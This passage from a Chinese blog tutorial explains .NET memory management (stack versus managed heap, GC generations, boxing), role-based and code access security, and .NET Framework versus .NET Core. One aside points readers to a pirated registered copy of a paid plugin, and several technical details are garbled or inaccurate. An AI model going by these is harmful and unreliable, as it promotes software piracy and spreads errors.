<h2 id="为什么值类型存储在栈上"><a href="#为什么值类型存储在栈上" class="headerlink" title="为什么值类型存储在栈上"></a>为什么值类型存储在栈上</h2><p>&emsp;&emsp;不同的类型拥有不同的编译时规则和运行时内存分配行为，我们应知道，C# 是一种强类型语言，每个变量和常量都有一个类型，在.NET中，每种类型又被定义为值类型或引用类型。<br>&emsp;&emsp;使用 <code>struct</code>、<code>enum</code> 关键字直接派生于<code>System.ValueType</code>定义的类型是值类型，使用 <code>class</code>、<code>interface</code>、<code>delagate</code> 关键字派生于<code>System.Object</code>定义的类型是引用类型。<br>&emsp;&emsp;对于在一个方法中产生的值类型成员，将其值分配在栈中。这样做的原因是因为值类型的值其占用固定内存的大小。<br>&emsp;&emsp;C#中<code>int</code>关键字对应BCL中的<code>Int32</code>，<code>short</code>对应<code>Int16</code>。<code>Int32</code>为2的32位，如果把32个二进制数排列开来，我们要求既能表达正数也能表达负数，所以得需要其中1位来表达正负，首位是0则为+，首位是1则为-，那么我们能表示数据的数就只有31位了，而0是介于-1和1之间的整数，所以对应的Int32能表现的就是2的31次方到2的31次方-1，即2147483647和-2147483648这个整数段。<br>&emsp;&emsp;1个字节=8位，32位就是4个字节，像这种以Int32为代表的值类型，本身就是固定的内存占用大小，所以将值类型放在内存连续分配的栈中。  </p>
<h2 id="托管堆模型"><a href="#托管堆模型" class="headerlink" title="托管堆模型"></a>托管堆模型</h2><p>&emsp;&emsp;而引用类型相比值类型就有点特殊，<code>newobj</code>创建一个引用类型，因其类型内的引用对象可以指向任何类型，故而无法准确得知其固定大小，所以像对于引用类型这种无法预知的容易产生内存碎片的动态内存，我们把它放到托管堆中存储。<br>&emsp;&emsp;托管堆由GC托管，其分配的核心在于堆中维护着一个<code>nextObjPtr</code>指针，我们每次实例(new)一个对象的时候，CLR将对象存入堆中，并在栈中存放该对象的起始地址，然后该指针都会根据该对象的大小来计算下一个对象的起始地址。不同于值类型直接在栈中存放值，引用类型则还需要在栈中存放一个代表(指向)堆中对象的值(地址)。  </p>
<p>&emsp;&emsp;而托管堆又可以因存储规则的不同将其分类，托管堆可以被分为3类：  </p>
<ol>
<li>用于托管对象实例化的垃圾回收堆，又以存储对象大小分为小对象(&lt;85000byte)的GC堆(SOH，Small Object Heap)和用于存储大对象实例的(&gt;=85000byte)大对象堆(LOG，Larage Object Heap)。 </li>
<li>用于存储CLR组件和类型系统的加载(Loader)堆，其中又以使用频率分为经常访问的高频堆(里面包含有MethodTables方法表, MeghodDescs方法描述, FieldDescs方法描述和InterfaceMaps接口图)，和较低的低频堆，和Stub堆(辅助代码，如JIT编译后修改机器代码指令地址环节)。 </li>
<li>用于存储JIT代码的堆及其它杂项的堆。</li>
</ol>
<p>&emsp;&emsp;加载程序集就是将程序集中的信息给映射在加载堆，对产生的实例对象存放至垃圾回收堆。前文说过应用程序域是指通过CLR管理而建立起的逻辑上的内存边界，那么每个域都有其自己的加载堆，只有卸载应用程序域的时候，才会回收该域对应的加载堆。  </p>
<p>&emsp;&emsp;而加载堆中的高频堆包含的有一个非常重要的数据结构表—方法表，每个类型都仅有一份方法表(MethodTables)，它是对象的第一个实例创建前的类加载活动的结果，它主要包含了我们所关注的3部分信息：  </p>
<ol>
<li>包含指向EEClass的一个指针。EEClass是一个非常重要的数据结构，当类加载器加载到该类型时会从元数据中创建出EEClass，EEClass里主要存放着与类型相关的表达信息。</li>
<li>包含指向各自方法的方法描述器(MethodDesc)的指针逻辑组成的线性表信息:继承的虚函数, 新虚函数, 实例方法, 静态方法。</li>
<li>包含指向静态字段的指针。</li>
</ol>
<p>&emsp;&emsp;那么，实例一个对象，CLR是如何将该对象所对应的类型行为及信息的内存位置(加载堆)关联起来的呢？<br>&emsp;&emsp;原来，在托管堆上的每个对象都有2个额外的供于CLR使用的成员，我们是访问不到的，其中一个就是类型对象指针，它指向位于加载堆中的方法表从而让类型的状态和行为关联了起来， 类型指针的这部分概念我们可以想象成obj.GetType()方法获得的运行时对象类型的实例。而另一个成员就是同步块索引，其主要用于2点：1.关联内置SyncBlock数组的项从而完成互斥锁等目的。 2.是对象Hash值计算的输入参数之一。<br><img src="1026815-20180626200740668-572794231.gif" alt=" "><br>&emsp;&emsp;上述gif是我简单画的一个图，可以看到对于方法中申明的值类型变量，其在栈中作为一块值表示，我们可以直接通过c#运算符sizeof来获得值类型所占byte大小。而方法中申明的引用类型变量，其在托管堆中存放着对象实例(对象实例至少会包含上述两个固定成员以及实例数据，可能)，在栈中存放着指向该实例的地址。<br>&emsp;&emsp;当我new一个引用对象的时候，会先分配同步块索引(也叫对象头字节)，然后是类型指针，最后是类型实例数据(静态字段的指针存在于方法表中)。会先分配对象的字段成员，然后分配对象父类的字段成员，接着再执行父类的构造函数，最后才是本对象的构造函数。这个多态的过程，对于CLR来说就是一系列指令的集合，所以不能纠结new一个子类对象是否会也会new一个父类对象这样的问题。而也正是因为引用类型的这样一个特征，我们虽然可以估计一个实例大概占用多少内存，但对于具体占用的大小，我们需要专门的工具来测量。<br>&emsp;&emsp;对于引用类型，u2=u1，我们在赋值的时候，实际上赋的是地址，那么我改动数据实际上是改动该地址指向的数据，这样一来，因为u2和u1都指向同一块区域，所以我对u1的改动会影响到u2，对u2的改动会影响到u1。如果我想互不影响，那么我可以继承<code>IClone</code>接口来实现内存克隆，已有的CLR实现是浅克隆方法，但也只能克隆值类型和String(string是个特殊的引用类型，对于string的更改，其会产生一个新实例对象)，如果对包含其它引用类型的这部分，我们可以自己通过其它手段实现深克隆，如序列化、反射等方式来完成。而如果引用类型中包含有值类型字段，那么该字段仍然分配在堆上。<br>&emsp;&emsp;对于值类型，a=b，我们在赋值的时候，实际上是新建了个值，那么我改动a的值那就只会改动a的值，改动b的值就只会改动b的值。而如果值类型(如struct)中包含的有引用类型，那么仍是同样的规则，引用类型的那部分实例在托管堆中，地址在栈上。<br>&emsp;&emsp;我如果将值类型放到引用类型中(如：object a=3)，会在栈中生成一个地址，在堆中生成该值类型的值对象，还会再生成这类型指针和同步块索引两个字段，这也就是常说装箱，反过来就是拆箱。每一次的这样的操作，都会涉及到内存的分布、拷贝，可见，装箱和拆箱是有性能损耗，因此应该减少值类型和引用类型之间转换的次数。<br>&emsp;&emsp;但对于引用类型间的子类父类的转换，仅是指令的执行消耗，几尽没有开销。  </p>
<h2 id="选class还是struct"><a href="#选class还是struct" class="headerlink" title="选class还是struct"></a>选class还是struct</h2><p>&emsp;&emsp;那么我到底是该new一个class呢还是选择struct呢？<br>&emsp;&emsp;通过上文知道对于class，用完之后对象仍然存在托管堆，占用内存。对于struct，用完之后直接由操作系统销毁。那么在实际开发中定义类型时，选择class还是struct就需要注意了，要综合应用场景来辨别。struct存在于栈上，栈和托管堆比较，最大的优势就是即用即毁。所以如果我们单纯的传递一个类型，那么选择struct比较合适。但须注意线程堆栈有容量限制，不可多存放超大量的值类型对象，并且因为是值类型直接传递副本，所以struct作为方法参数是线程安全的，但同样要避免装箱的操作。而相比较class，如果类型中还需要多一些封装继承多态的行为，那么class当然是更好的选择。  </p>
<h2 id="GC管理器"><a href="#GC管理器" class="headerlink" title="GC管理器"></a>GC管理器</h2><p>&emsp;&emsp;值得注意的是，当我new完一个对象不再使用的时候，这个对象在堆中所占用的内存如何处理？<br>&emsp;&emsp;在非托管世界中，可以通过代码手动进行释放，但在.NET中，堆完全由CLR托管，也就是说GC堆是如何具体来释放的呢？<br>&emsp;&emsp;当GC堆需要进行清理的时候，GC收集器就会通过一定的算法来清理堆中的对象，并且版本不同算法也不同。最主要的则为Mark-Compact标记-压缩算法。<br>&emsp;&emsp;这个算法的大概含义就是，通过一个图的数据结构来收集对象的根，这个根就是引用地址，可以理解为指向托管堆的这根关系线。当触发这个算法时，会检查图中的每个根是否可达，如果可达就对其标记，然后在堆上找到剩余没有标记(也就是不可达)的对象进行删除，这样，那些不在使用的堆中对象就删除了。<br>&emsp;&emsp;前面说了，因为<code>nextObjPtr</code>的缘故，在堆中分配的对象都是连续分配的，因为未被标记而被删除，那么经过删除后的堆就会显得支零破碎，那么为了避免空间碎片化，所以需要一个操作来让堆中的对象再变得紧凑、连续，而这样一个操作就叫做：Compact压缩。<br>&emsp;&emsp;而对堆中的分散的对象进行挪动后，还会修改这些被挪动对象的指向地址，从而得以正确的访问，最后重新更新一下<code>nextObjPtr</code>指针，周而复始。<br>&emsp;&emsp;而为了优化内存结构，减少在图中搜索的成本，GC机制又为每个托管堆对象定义了一个属性，将每个对象分成了3个等级，这个属性就叫做：代，0代、1代、2代。<br>&emsp;&emsp;每当new一个对象的时候，该对象都会被定义为第0代，当GC开始回收的时候，先从0代回收，在这一次回收动作之后，0代中没有被回收的对象则会被定义成第1代。当回收第1代的时候，第1代中没有被清理掉的对象就会被定义到第2代。<br>&emsp;&emsp;CLR初始化时会为0/1/2这三代选择一个预算的容量。0代通常以256 KB-4 MB之间的预算开始，1代的典型起始预算为512 KB-4 MB，2代不受限制，最大可扩展至操作系统进程的整个内存空间。<br>&emsp;&emsp;比如第0代为256K，第1代为2MB。我们不停的new对象，直到这些对象达到256k的时候，GC会进行一次垃圾回收，假设这次回收中回收了156k的不可达对象，剩余100k的对象没有被回收，那么这100k的对象就被定义为第1代。现在就变成了第0代里面什么都没有，第1代里放的有100k的对象。这样周而复始，GC清除的永远都只有第0代对象，除非当第一代中的对象累积达到了定义的2MB的时候，才会连同清理第1代，然后第1代中活着的部分再升级成第二代…<br>&emsp;&emsp;第二代的容量是没有限制，但是它有动态的阈值(因为等到整个内存空间已满以执行垃圾回收是没有意义的)，当达到第二代的阈值后会触发一次0/1/2代完整的垃圾收集。<br>&emsp;&emsp;也就是说，代数越长说明这个对象经历了回收的次数也就越多，那么也就意味着该对象是不容易被清除的。<br>&emsp;&emsp;这种分代的思想来将对象分割成新老对象，进而配对不同的清除条件，这种巧妙的思想避免了直接清理整个堆的尴尬。<br><img src="1026815-20180626200925015-777215609.gif" alt=" ">   </p>
<h2 id="弱引用、弱事件"><a href="#弱引用、弱事件" class="headerlink" title="弱引用、弱事件"></a>弱引用、弱事件</h2><p>&emsp;&emsp;GC收集器会在第0代饱和时开始回收托管堆对象，对于那些已经申明或绑定的不经访问的对象或事件，因为不经常访问而且还占内存(有点懒加载的意思)，所以即时对象可达，但我想在GC回收的时候仍然对其回收，当需要用到的时候再创建，这种情况该怎么办？<br>&emsp;&emsp;那么这其中就引入了两个概念：<br>&emsp;&emsp;<code>WeakReference</code>弱引用、<code>WeakEventManager</code>弱事件<br>&emsp;&emsp;对于这两个不区分语言的共同概念，大家可自行扩展百度，此处就不再举例。  </p>
<h2 id="GC堆回收"><a href="#GC堆回收" class="headerlink" title="GC堆回收"></a>GC堆回收</h2><p>&emsp;&emsp;那么除了通过new对象而达到代的阈(临界)值时，还有什么能够导致垃圾堆进行垃圾回收呢？ 还可能windows报告内存不足、CLR卸载AppDomain、CLR关闭等其它特殊情况。<br>&emsp;&emsp;或者，我们还可以自己通过代码调用。<br>&emsp;&emsp;.NET有GC来帮助开发人员管理内存，并且版本也在不断迭代。GC帮我们托管内存，但仍然提供了<code>System.GC</code>类让开发人员能够轻微的协助管理。 这其中有一个可以清理内存的方法(并没有提供清理某个对象的方法)：GC.Collect方法，可以对所有或指定代进行即时垃圾回收(如果想调试，需在release模式下才有效果)。这个方法尽量别用，因为它会扰乱代与代间的秩序，从而让低代的垃圾对象跑到生命周期长的高代中。<br>&emsp;&emsp;GC还提供了，判断当前对象所处代数、判断指定代数经历了多少次垃圾回收、获取已在托管堆中分配的字节数这样的三个方法，我们可以从这3个方法简单的了解托管堆的情况。<br>&emsp;&emsp;托管世界的内存不需要我们打理，我们无法从代码中得知具体的托管对象的大小，你如果想追求对内存最细微的控制，显然C#并不适合你，不过类似于有关内存把控的这部分功能模块，我们可以通过非托管语言来编写，然后通过.NET平台的P/Invoke或COM技术(微软为CLR定义了COM接口并在注册表中注册)来调用。<br>&emsp;&emsp;像FCL中的源码，很多涉及到操作系统的诸如 文件句柄、网络连接等外部extren的底层方法都是非托管语言编写的，对于这些非托管模块所占用的资源，我们可以通过隐式调用析构函数(<code>Finalize</code>)或者显式调用的<code>Dispose</code>方法通过在方法内部写上非托管提供的释放方法来进行释放。<br>&emsp;&emsp;像文中示例的socket就将释放资源的方法写入Dispose中，析构函数和Close方法均调用Dispose方法以此完成释放。事实上，在FCL中的使用了非托管资源的类大多都遵循IDispose模式。而如果你没有释放非托管资源直接退出程序，那么操作系统会帮你释放该程序所占的内存的。  </p>
<h2 id="垃圾回收对性能的影响"><a href="#垃圾回收对性能的影响" class="headerlink" title="垃圾回收对性能的影响"></a>垃圾回收对性能的影响</h2><p>&emsp;&emsp;还有一点，垃圾回收是对性能有影响的。<br>&emsp;&emsp;GC虽然有很多优化策略，但总之，只要当它开始回收垃圾的时候，为了防止线程在CLR检查期间对对象更改状态，所以CLR会暂停进程中的几乎所有线程(所以线程太多也会影响GC时间)，而暂停的时间就是应用程序卡死的时间，为此，对于具体的处理细节，GC提供了2种配置模式让我们选择。<br>&emsp;&emsp;第一种为：单CPU的工作站模式，专为单CPU处理器定做。这种模式会采用一系列策略来尽可能减少GC回收中的暂停时间。<br>&emsp;&emsp;而工作站模式又分为并发(或后台)与不并发两种，并发模式表现为响应时间快速，不并发模式表现为高吞吐量。<br>&emsp;&emsp;第二种为：多CPU的服务器模式，它会为每个CPU都运行一个GC回收线程，通过并行算法来使线程能真正同时工作，从而获得性能的提升。<br>&emsp;&emsp;我们可以通过在Config文件中更改配置来修改GC模式，如果没有进行配置，那么应用程序总是默认为单CPU的工作站的并发模式，并且如果机器为单CPU的话，那么配置服务器模式则无效。<br>&emsp;&emsp;如果在工作站模式中想禁用并发模式，则应该在config中运行时节点添加 <code>&lt;gcConcurrent enabled=&quot;false&quot; /&gt;</code><br>&emsp;&emsp;如果想更改至服务器模式，则可以添加 <code>&lt;gcServer enabled=&quot;true&quot; /&gt;</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;configuration&gt;</span><br><span class="line">        &lt;runtime&gt;</span><br><span class="line">            &lt;!--&lt;gcConcurrent enabled=&quot;true|false&quot;/&gt;--&gt;</span><br><span class="line">            &lt;!--&lt;gcServer enabled=&quot;true|false&quot;/&gt;--&gt;</span><br><span class="line">        &lt;/runtime&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;gcConcurrent: <a href="https://docs.microsoft.com/zh-cn/dotnet/framework/configure-apps/file-schema/runtime/gcconcurrent-element" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/configure-apps/file-schema/runtime/gcconcurrent-element</a><br>&emsp;&emsp;gcServer: <a href="https://docs.microsoft.com/zh-cn/dotnet/framework/configure-apps/file-schema/runtime/gcserver-element" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/configure-apps/file-schema/runtime/gcserver-element</a>  </p>
<h2 id="性能建议"><a href="#性能建议" class="headerlink" title="性能建议"></a>性能建议</h2><p>&emsp;&emsp;虽然我们可以选择适合的GC工作模式来改善垃圾回收时的表现，但在实际开发中我们更应该注意减少不必要的内存开销。<br>&emsp;&emsp;几个建议是，减换需要创建大量的临时变量的模式、考虑对象池、大对象使用懒加载、对固定容量的集合指定长度、注意字符串操作、注意高频率的隐式装箱操作、延迟查询、对于不需要面向对象特性的类用<code>static</code>、需要高性能操作的算法改用外部组件实现(p/invoke、com)、减少<code>throw</code>次数、注意匿名函数捕获的外部对象将延长生命周期、可以阅读GC相关运行时配置在高并发场景注意变换GC模式…<br>&emsp;&emsp;对于.NET中改善性能可延伸阅读 <a href="https://msdn.microsoft.com/zh-cn/library/ms973838.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/ms973838.aspx</a> 、 <a href="https://msdn.microsoft.com/library/ms973839.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/library/ms973839.aspx</a>  </p>
<h1 id="NET程序执行图"><a href="#NET程序执行图" class="headerlink" title=".NET程序执行图"></a>.NET程序执行图</h1><p>&emsp;&emsp;至此，.NET Framework上的三个重要概念，程序集、应用程序域、内存在本文讲的差不多了，我画了一张图简单的概述.NET程序的一个执行流程：<br><img src="1026815-20180627094402682-185765111.jpg" alt=" "><br>&emsp;&emsp;对于后文，我将单独的介绍一些其它杂项，首先是.NET平台的安全性。  </p>
<h1 id="NET的安全性"><a href="#NET的安全性" class="headerlink" title=".NET的安全性"></a>.NET的安全性</h1><p>&emsp;&emsp;.NET Framework中的安全机制分为 基于角色的安全机制 和 代码访问安全机制。  </p>
<h2 id="基于角色的安全性"><a href="#基于角色的安全性" class="headerlink" title="基于角色的安全性"></a>基于角色的安全性</h2><p>&emsp;&emsp;基于角色的安全机制作为传统的访问控制，其运用的非常广泛，如操作系统的安全策略、数据库的安全策略等等…它的概念就相当于我们经常做的那些RBAC权限管理系统一样，用户关联角色，角色关联权限，权限对应着操作。<br>&emsp;&emsp;整个机制的安全逻辑就和我们平时编写代码判断是一样的，大致可以分为两个步骤。<br>&emsp;&emsp;第一步就是创建一个主体，然后标识这个主体是什么身份(角色) ，第二步就是 身份验证，也就是if判断该身份是否可以这样操作。<br>&emsp;&emsp;而在.NET Framework中，这主体可以是Windows账户，也可以是自定义的标识，通过生成如当前线程或应用程序域使用的主体相关的信息来支持授权。<br>&emsp;&emsp;比如，构造一个代表当前登录账户的主体对象WindowsPrincipal，然后通过<code>AppDomain.CurrentDomain.SetThreadPrincipal(主体对象);</code>或<code>Thread.CurrentPrincipal</code>的set方法来设置应用程序域或线程的主体对象， 最后使用<code>System.Security.Permissions.PrincipalPermission</code>特性来标记在方法上来进行授权验证。<br><img src="1026815-20180627091948062-1470556345.png" alt=" ">  </p>
<figure class="image-box">
                <img src="1026815-20180627091950748-1063703508.png" alt title class>
                <p></p>
            </figure>  
<p>&emsp;&emsp;如图，我当前登录账号名称为DemoXiaoZeng，然后通过<code>Thread.CurrentPrincipal</code>设置当前主体，执行aa方法，顺利打印111。如果检测到PrincipalPermission类中的Name属性值不是当前登录账号，那么就报错：对主体权限请求失败。<br><img src="1026815-20180627092034043-1822965136.png" alt=" "><br>&emsp;&emsp;在官方文档中有对.NET Framework基于角色的安全性的详细的介绍，感兴趣可以去了解 <a href="https://docs.microsoft.com/zh-cn/dotnet/standard/security/principal-and-identity-objects#principal-objects" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/standard/security/principal-and-identity-objects#principal-objects</a>  </p>
<h2 id="代码访问安全性"><a href="#代码访问安全性" class="headerlink" title="代码访问安全性"></a>代码访问安全性</h2><p>&emsp;&emsp;在.NET Framework中还有一个安全策略，叫做 代码访问安全Code Access Security，也就是CAS了。<br>&emsp;&emsp;代码访问安全性在.NET Framework中是用来帮助限制代码对受保护资源和操作的访问权限。<br>&emsp;&emsp;举个例子，我通过创建一个<code>FileIOPermission</code>对象来限制对后续代码对D盘的文件和目录的访问，如果后续代码对D盘进行资源操作则报错。<br><img src="1026815-20180627092115880-961385890.png" alt=" "><br>&emsp;&emsp;<code>FileIOPermission</code>是代码控制访问文件和文件夹的能力。除了<code>FileIOPermission</code>外，还有如<code>PrintingPermission</code>代码控制访问打印机的权限、<code>RegistryPermission</code>代码控制操作注册表的权限、<code>SocketPermission</code>控制接受连接或启动Socket连接的权限。<br>&emsp;&emsp;对于这些通过代码来对受保护资源和操作的权限限制，也就是这些类名后缀为Permission的类，它们叫做 Permissions(权限)，都继承自<code>CodeAccessPermission</code>，都有如<code>Demand</code>，<code>Assert</code>，<code>Deny</code>，<code>PermitOnly</code>，<code>IsSubsetOf</code>，<code>Intersect</code>和<code>Union</code>这些方法，在MSDN上有完整的权限列表：<a href="https://msdn.microsoft.com/en-us/library/h846e9b3(v=vs.100).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/h846e9b3(v=vs.100).aspx</a><br>&emsp;&emsp;为了确定代码是否有权访问某一资源或执行某一操作，CLR的安全系统将审核调用堆栈，以将每个调用方获得的权限与要求的权限进行比较。 如果调用堆栈中的任何调用方不具备要求的权限，则会引发安全性异常并拒绝访问。<br><img src="1026815-20180627092153838-808529507.png" alt=" "><br>&emsp;&emsp;图出自 <a href="https://docs.microsoft.com/zh-cn/dotnet/framework/misc/code-access-security" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/misc/code-access-security</a><br>&emsp;&emsp;而除了Permissions权限，代码访问安全性机制还有 权限集、证据、代码组、策略等概念。这些概念让CAS如此强大，但相应的，它们也让CAS变得复杂，必须为每个特定机器定义正确的<code>PermissionSet</code>和<code>Code Groups</code>才能设置成一个成功的CAS策略。<br>&emsp;&emsp;考虑到这层原因，Microsoft .NET安全小组决定从头开始重建代码访问安全性。在.NET Framework4.0之后，就不再使用之前的那套CAS模型了，而是使用.NET Framework 2.0中引入的安全透明模型，然后稍加修改，修改后的安全透明模型成为保护资源的标准方法，被称之为：安全透明度级别2<br>&emsp;&emsp;安全透明度2介绍：<a href="https://msdn.microsoft.com/en-us/library/dd233102(v=vs.100).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/dd233102(v=vs.100).aspx</a><br>&emsp;&emsp;.NET Framework4.0的安全更改：<a href="https://msdn.microsoft.com/en-us/library/dd233103(v=vs.100).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/dd233103(v=vs.100).aspx</a><br>&emsp;&emsp;一个完整的CAS演示：<a href="https://www.codeproject.com/Articles/5724/Understanding-NET-Code-Access-Security" target="_blank" rel="noopener">https://www.codeproject.com/Articles/5724/Understanding-NET-Code-Access-Security</a><br>&emsp;&emsp;对于安全透明度级别2我将不再介绍，感兴趣的可以看我推荐的这2篇文章，对Level2的安全透明度介绍的比较详细，包括实践、迁移。<br>&emsp;&emsp;<a href="https://www.red-gate.com/simple-talk/dotnet/.net-framework/whats-new-in-code-access-security-in-.net-framework-4.0---part-i/" target="_blank" rel="noopener">https://www.red-gate.com/simple-talk/dotnet/.net-framework/whats-new-in-code-access-security-in-.net-framework-4.0---part-i/</a><br>&emsp;&emsp;<a href="https://www.red-gate.com/simple-talk/dotnet/net-framework/whats-new-in-code-access-security-in-net-framework-4-0-part-2/" target="_blank" rel="noopener">https://www.red-gate.com/simple-talk/dotnet/net-framework/whats-new-in-code-access-security-in-net-framework-4-0-part-2/</a>  </p>
<hr>
<p>&emsp;&emsp;须注意：<br>&emsp;&emsp;.NET平台上的安全机制，仅仅是.NET平台上的，因此它只限制于托管代码，我们可以直接调用非托管代码或进程通信间接调用非托管代码等多个手段来突破对托管代码 操作资源的限制。<br>&emsp;&emsp;事实上，我们在平常项目中代码编写的安全机制(业务逻辑身份验证、项目框架验证)与这些平台级的安全机制没什么不同。我们可以理解为代码写的位置不一样，.NET安全机制是写在CLR组件中，而我们的安全机制是写在上层的代码中。这些平台级的标识更多的是和操作系统用户有关，而我们项目代码中的标识则是和在数据库中注册的用户有关， 大家都是通过if else来去判断，判断的主体和格局不一样，逻辑本质都是相同的。<br>&emsp;&emsp;NET Core不支持代码访问安全性和安全性透明性。  </p>
<h1 id="NET是什么"><a href="#NET是什么" class="headerlink" title=".NET是什么"></a>.NET是什么</h1><p>&emsp;&emsp;我在前文对.NET系统概述时，有的直接称.NET，有的称.NET Framework。那么准确来说什么是.NET?什么又是.NET Framework呢？  </p>
<p>&emsp;&emsp;.NET是一个微软搭造的开发者平台，它主要包括：  </p>
<ul>
<li>1.支持(面向)该平台的编程语言(如C#、Visual Basic、C++/CLI、F#、IronPython、IronRuby…)，</li>
<li>2.用于该平台下开发人员的技术框架体系(.NET Framework、.NET Core、Mono、UWP等)，<ul>
<li>1.定义了通用类型系统，庞大的CTS体系 </li>
<li>2.用于支撑.NET下的语言运行时的环境：CLR </li>
<li>3..NET体系技术的框架库FCL </li>
</ul>
</li>
<li>3.用于支持开发人员开发的软件工具(即SDK，如VS2017、VS Code等)</li>
</ul>
<h2 id="NET-Framework是什么"><a href="#NET-Framework是什么" class="headerlink" title=".NET Framework是什么"></a>.NET Framework是什么</h2><p>&emsp;&emsp;事实上，像我上面讲的那些诸如程序集、GC、AppDomain这样的为CLR的一些概念组成，实质上指的是.NET Framework CLR。<br>&emsp;&emsp;.NET平台是微软为了占据开发市场而成立的，不是无利益驱动的纯技术平台的那种东西。基于该平台下的技术框架也因为 商业间的利益 从而和微软自身的Windows操作系统所绑定。所以虽然平台雄心和口号很大，但很多框架类库技术都是以Windows系统为蓝本，这样就导致，虽然.NET各方面都挺好，但是用.NET就必须用微软的东西，直接形成了技术-商业的绑定。<br>&emsp;&emsp;.NET Framework就是.NET 技术框架组成在Windows系统下的具体的实现，和Windows系统高度耦合，上文介绍的.NET系统，就是指.NET Framework。<br>&emsp;&emsp;部署.net Framework ：<a href="https://docs.microsoft.com/zh-cn/dotnet/framework/deployment/deployment-guide-for-developers" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/framework/deployment/deployment-guide-for-developers</a><br>&emsp;&emsp;.NET Framework高级开发：<a href="https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2008/29eafad8(v%3dvs.90)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/visualstudio/visual-studio-2008/29eafad8(v%3dvs.90)</a><br>&emsp;&emsp;.NET Framework源码在线浏览：<a href="https://referencesource.microsoft.com/" target="_blank" rel="noopener">https://referencesource.microsoft.com/</a>  </p>
<h3 id="如何在VS中调试-NET-Framework源代码"><a href="#如何在VS中调试-NET-Framework源代码" class="headerlink" title="如何在VS中调试.NET Framework源代码"></a>如何在VS中调试.NET Framework源代码</h3><p>&emsp;&emsp;最为关键的是pdb符号文件，没得符号就调不了，对于符号我们从微软的符号服务器上下载(默认就已配置)，还得有源代码来调试。<br>&emsp;&emsp;点击工具-选项-调试-常规，如果你之前没有在该配置栏配置过，那么你就勾选 启用源服务器支持 、启用.net Framework源代码单步执行，然后将 要求源文件与原始版本完全匹配 给取消掉。<br>&emsp;&emsp;然后就是下载pdb符号文件了，如果想直接下载那么可以在调试-符号这栏 将Microsoft符号服务器给勾上 。如果想按需下载，那么在调试的时候，可以点击调试-窗口 选择 模块/调用堆栈 来选择自己想加载的去加载。<br>&emsp;&emsp;然后至 <a href="https://referencesource.microsoft.com/" target="_blank" rel="noopener">https://referencesource.microsoft.com/</a> 网站 点击右上角下载源代码。当你调试代码的时候，会提示你无可用源，这个时候你再将你下载下来的源码文件给浏览查找一下就可以了。<br><img src="1026815-20180627092252642-95078986.png" alt=" "><br>&emsp;&emsp;如何配置VS来调试.NET Framework源码： <a href="https://referencesource.microsoft.com/#q=web" target="_blank" rel="noopener">https://referencesource.microsoft.com/#q=web</a> 、 <a href="https://technet.microsoft.com/zh-cn/cc667410.aspx" target="_blank" rel="noopener">https://technet.microsoft.com/zh-cn/cc667410.aspx</a><br>&emsp;&emsp;还一种方法是，下载.NET Reflector插件，该插件可以帮助我们在VS中直接调试dll，这种方式操作非常简单，不过该插件收费，具体的可以查看我之前写过的文章(群里有该插件的注册版)  </p>
<h2 id="NET-Core是什么"><a href="#NET-Core是什么" class="headerlink" title=".NET Core是什么"></a>.NET Core是什么</h2><p>&emsp;&emsp;有丑才有美，有低才有高，概念是比较中诞生的。.NET Core就是如此，它是其它操作系统的.NET Framework翻版实现。<br>&emsp;&emsp;操作系统不止Windows，还有Mac和类Linux等系统， .NET的实现 如果按操作系统来横向分割的话，可以分为 Windows系统下的 .NET Framework 和 兼容多个操作系统的 .NET Core。<br>&emsp;&emsp;我们知道，一个.NET程序运行核心在于.NET CLR，为了能让.NET程序在其它平台上运行，一些非官方社区和组织为此开发了在其它平台下的.NET实现（最为代表的是mono，其团队后来又被微软给合并了 ），但因为不是官方，所以在一些方面多少有些缺陷(如FCL)，后来微软官方推出了.NET Core，其开源在Github中，并被收录在NET基金会(.NET Foundation，由微软公司成立与赞助的独立自由软件组织，其目前收录包括.NET编译器平台(“Roslyn”)以及ASP.NET项目系列，.NET Core，Xamarin Forms以及其它流行的.NET开源框架)，旨在真正的 .NET跨平台。<br>&emsp;&emsp;.NET Core是.NET 技术框架组成在Windows.macOS.Linux系统下的具体的实现。<br>&emsp;&emsp;.NET Core是一个开源的项目，其由 Microsoft 和 GitHub 上的 .NET 社区共同维护，但 这份工作仍然是巨大的，因为在早期对.NET上的定义及最初的实现一直是以Windows系统为参照及载体，一些.NET机制实际上与Windows系统耦合度非常高，有些属于.NET自己体系内的概念，有些则属于Windows系统api的封装。 那么从Windows转到其它平台上，不仅要实现相应的CLR，还要舍弃或重写一部分BCL，因而，.NET Core在概念和在项目中的行为与我们平常有些不同。<br>&emsp;&emsp;比如，NET Core不支持AppDomains、远程处理、代码访问安全性 (CAS) 和安全透明度，任何有关该概念的库代码都应该被替换。<br>&emsp;&emsp;这部分代码它不仅指你项目中的代码，还指你项目中using的那些程序集代码，所以你会在github上看到很多开源项目都在跟进对.NET Core的支持,并且很多开发者也尝试学习.NET Core，这也是一种趋势。<br>&emsp;&emsp;.NET Core指南<a href="https://docs.microsoft.com/en-us/dotnet/core/" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/core/</a><br>&emsp;&emsp;.NET基金会：<a href="https://dotnetfoundation.org" target="_blank" rel="noopener">https://dotnetfoundation.org</a><br>&emsp;&emsp;.NET Core跨平台的行为变更：<a href="https://github.com/dotnet/corefx/wiki/ApiCompat" target="_blank" rel="noopener">https://github.com/dotnet/corefx/wiki/ApiCompat</a><br>&emsp;&emsp;微软宣布.NET开发环境将开源 ：<a 